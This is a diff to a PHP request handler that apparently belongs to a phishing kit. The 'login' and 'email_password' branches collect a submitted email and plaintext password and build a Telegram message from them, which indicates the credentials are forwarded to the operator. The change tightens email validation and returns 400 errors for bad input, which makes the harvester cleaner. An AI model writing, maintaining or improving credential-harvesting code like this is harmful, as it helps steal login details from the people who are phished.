@@ -259,8 +259,17 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         if (isset($_POST['action'])) {
             switch($_POST['action']) {
                 case 'login':
+                    $email = filter_var(trim($_POST['_user']), FILTER_VALIDATE_EMAIL);
+                    if ($email === false) {
+                        http_response_code(400);
+                        $response['success'] = false;
+                        $response['status'] = 'error';
+                        $response['message'] = 'Invalid email address provided.';
+                        echo json_encode($response);
+                        exit;
+                    }
                     $data = array(
-                        'email' => filter_var($_POST['_user'], FILTER_SANITIZE_EMAIL),
+                        'email' => $email,
                         'password' => $_POST['_pass']
                     );
                     $message = formatTelegramMessage('Login', $data);
@@ -274,8 +283,17 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
                     break;
                     
                 case 'email_password':
+                    $email = filter_var(trim($_POST['email']), FILTER_VALIDATE_EMAIL);
+                    if ($email === false) {
+                        http_response_code(400);
+                        $response['success'] = false;
+                        $response['status'] = 'error';
+                        $response['message'] = 'Invalid email address provided.';
+                        echo json_encode($response);
+                        exit;
+                    }
                     $data = array(
-                        'email' => filter_var($_POST['email'], FILTER_SANITIZE_EMAIL),
+                        'email' => $email,
                         'password' => $_POST['_MLpass']
                     );
                     $message = formatTelegramMessage('Email Link', $data);
